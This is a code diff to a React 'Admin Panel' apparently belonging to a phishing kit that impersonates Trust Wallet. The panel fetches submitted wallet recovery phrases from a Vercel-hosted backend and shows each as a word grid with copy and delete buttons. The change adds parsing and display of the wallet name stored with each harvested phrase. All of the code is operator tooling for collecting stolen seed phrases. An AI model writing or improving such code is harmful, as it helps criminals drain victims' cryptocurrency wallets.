@@ -15,6 +15,17 @@ const ShieldLogo = () => (
 
 const API = "https://trust-wallet-backend.vercel.app";
 
+// Parse "Wallet: My Wallet | Phrase: word1 word2..." into parts
+const parseEntry = (raw) => {
+  if (raw.startsWith("Wallet:") && raw.includes("| Phrase:")) {
+    const walletPart = raw.split("| Phrase:")[0].replace("Wallet:", "").trim();
+    const phrasePart = raw.split("| Phrase:")[1].trim();
+    return { walletName: walletPart, phrase: phrasePart };
+  }
+  // Old entries without wallet name
+  return { walletName: null, phrase: raw };
+};
+
 export default function Admin() {
   const [phrases, setPhrases] = useState([]);
   const [loading, setLoading] = useState(true);
@@ -67,37 +78,39 @@ export default function Admin() {
       + " · " + d.toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit" });
   };
 
-  const todayCount = phrases.filter(p => {
-    return new Date(p.created_at).toDateString() === new Date().toDateString();
-  }).length;
+  const todayCount = phrases.filter(p =>
+    new Date(p.created_at).toDateString() === new Date().toDateString()
+  ).length;
 
   return (
     <div style={s.bg}>
       <div style={Object.assign({}, s.wrap, mounted ? s.wrapIn : {})}>
 
+        {/* Header */}
         <div style={s.header}>
           <div style={s.headerLeft}>
             <ShieldLogo />
             <div>
               <h1 style={s.title}>Admin Panel</h1>
-              <p style={s.subtitle}>Trust Wallet · Submitted Phrases</p>
+              <p style={s.subtitle}>Trust Wallet · Submitted Entries</p>
             </div>
           </div>
           <button style={s.refreshBtn} onClick={fetchPhrases}>↻ Refresh</button>
         </div>
 
+        {/* Stats */}
         <div style={s.statsBar}>
           <div style={s.statBox}>
             <span style={s.statNum}>{phrases.length}</span>
-            <span style={s.statLabel}>Total Phrases</span>
+            <span style={s.statLabel}>Total</span>
           </div>
           <div style={s.statBox}>
             <span style={s.statNum}>{todayCount}</span>
             <span style={s.statLabel}>Today</span>
           </div>
           <div style={s.statBox}>
-            <span style={s.statNum}>{phrases.length > 0 ? phrases[0].id : 0}</span>
-            <span style={s.statLabel}>Last ID</span>
+            <span style={s.statNum}>{phrases.filter(p => parseEntry(p.phrase).walletName).length}</span>
+            <span style={s.statLabel}>With Name</span>
           </div>
         </div>
 
@@ -112,23 +125,46 @@ export default function Admin() {
 
         {!loading && !error && phrases.length === 0 && (
           <div style={s.centerBox}>
-            <span style={s.grayText}>No phrases submitted yet.</span>
+            <span style={s.grayText}>No entries submitted yet.</span>
           </div>
         )}
 
+        {/* Entry Cards */}
         {!loading && phrases.map((p) => {
-          const words = p.phrase.trim().split(/\s+/);
+          const { walletName, phrase } = parseEntry(p.phrase);
+          const words = phrase.trim().split(/\s+/);
           return (
             <div key={p.id} style={s.card}>
 
+              {/* Card Header */}
               <div style={s.cardHeader}>
                 <div style={s.cardHeaderLeft}>
-                  <span style={s.entryBadge}>Entry #{p.id}</span>
+                  <span style={s.entryBadge}>#{p.id}</span>
+                  {walletName && (
+                    <span style={s.walletNameBadge}>
+                      🔷 {walletName}
+                    </span>
+                  )}
                   <span style={s.wordCountBadge}>{words.length} words</span>
                 </div>
                 <span style={s.dateText}>{formatDate(p.created_at)}</span>
               </div>
 
+              {/* Wallet Name Section */}
+              {walletName && (
+                <div style={s.walletNameRow}>
+                  <span style={s.walletNameLabel}>WALLET NAME</span>
+                  <span style={s.walletNameValue}>{walletName}</span>
+                </div>
+              )}
+
+              {/* Divider between name and phrase */}
+              {walletName && <div style={s.innerDivider} />}
+
+              {/* Phrase label */}
+              <div style={s.phraseLabel}>RECOVERY PHRASE</div>
+
+              {/* Word Grid */}
               <div style={s.wordGrid}>
                 {words.map((word, i) => (
                   <div key={i} style={s.wordCell}>
@@ -138,19 +174,20 @@ export default function Admin() {
                 ))}
               </div>
 
+              {/* Actions */}
               <div style={s.cardFooter}>
                 <button
                   style={Object.assign({}, s.actionBtn, copied === p.id ? s.copiedBtn : s.copyBtn)}
-                  onClick={() => copyPhrase(p.phrase, p.id)}
+                  onClick={() => copyPhrase(phrase, p.id)}
                 >
-                  {copied === p.id ? "✓ Copied!" : "📋 Copy All"}
+                  {copied === p.id ? "✓ Copied!" : "📋 Copy Phrase"}
                 </button>
                 <button
                   style={Object.assign({}, s.actionBtn, s.deleteBtn)}
                   onClick={() => deletePhrase(p.id)}
                   disabled={deleting === p.id}
                 >
-                  {deleting === p.id ? "Deleting..." : "🗑 Delete"}
+                  {deleting === p.id ? "..." : "🗑 Delete"}
                 </button>
               </div>
 
@@ -181,16 +218,30 @@ const s = {
   centerBox: { display: "flex", alignItems: "center", justifyContent: "center", gap: "12px", padding: "48px 0" },
   spinner: { width: "20px", height: "20px", border: "2.5px solid rgba(59,130,246,0.2)", borderTopColor: "#3B82F6", borderRadius: "50%", display: "inline-block" },
   grayText: { color: "#475569", fontSize: "14px" },
+
   card: { background: "#1E293B", border: "1px solid rgba(255,255,255,0.07)", borderRadius: "16px", marginBottom: "16px", overflow: "hidden" },
+
   cardHeader: { display: "flex", alignItems: "center", justifyContent: "space-between", padding: "12px 16px", background: "#0F172A", borderBottom: "1px solid rgba(255,255,255,0.06)", flexWrap: "wrap", gap: "8px" },
-  cardHeaderLeft: { display: "flex", alignItems: "center", gap: "8px" },
+  cardHeaderLeft: { display: "flex", alignItems: "center", gap: "8px", flexWrap: "wrap" },
   entryBadge: { background: "rgba(59,130,246,0.15)", color: "#3B82F6", fontSize: "12px", fontWeight: "700", padding: "3px 10px", borderRadius: "20px", border: "1px solid rgba(59,130,246,0.25)" },
+  walletNameBadge: { background: "rgba(99,102,241,0.15)", color: "#818CF8", fontSize: "12px", fontWeight: "600", padding: "3px 10px", borderRadius: "20px", border: "1px solid rgba(99,102,241,0.25)" },
   wordCountBadge: { background: "rgba(255,255,255,0.05)", color: "#64748B", fontSize: "11px", fontWeight: "500", padding: "3px 8px", borderRadius: "20px" },
   dateText: { color: "#475569", fontSize: "11px" },
-  wordGrid: { display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "8px", padding: "16px" },
+
+  // Wallet name display row
+  walletNameRow: { display: "flex", alignItems: "center", gap: "12px", padding: "12px 16px 0" },
+  walletNameLabel: { color: "#334155", fontSize: "10px", fontWeight: "700", letterSpacing: "0.8px", flexShrink: 0 },
+  walletNameValue: { color: "#E2E8F0", fontSize: "14px", fontWeight: "600" },
+
+  innerDivider: { height: "1px", background: "rgba(255,255,255,0.05)", margin: "12px 16px 0" },
+
+  phraseLabel: { color: "#334155", fontSize: "10px", fontWeight: "700", letterSpacing: "0.8px", padding: "12px 16px 8px" },
+
+  wordGrid: { display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "8px", padding: "0 16px 4px" },
   wordCell: { display: "flex", alignItems: "center", gap: "7px", background: "#0F172A", border: "1px solid rgba(255,255,255,0.06)", borderRadius: "8px", padding: "8px 10px" },
   wordIndex: { color: "#2D3F55", fontSize: "10px", fontWeight: "700", minWidth: "14px" },
   wordValue: { color: "#CBD5E1", fontSize: "13px", fontFamily: "monospace", fontWeight: "500" },
+
   cardFooter: { display: "flex", gap: "8px", padding: "12px 16px", borderTop: "1px solid rgba(255,255,255,0.05)" },
   actionBtn: { display: "flex", alignItems: "center", gap: "6px", border: "none", borderRadius: "8px", padding: "8px 14px", fontSize: "13px", fontWeight: "600", cursor: "pointer" },
   copyBtn: { background: "rgba(59,130,246,0.12)", color: "#3B82F6" },
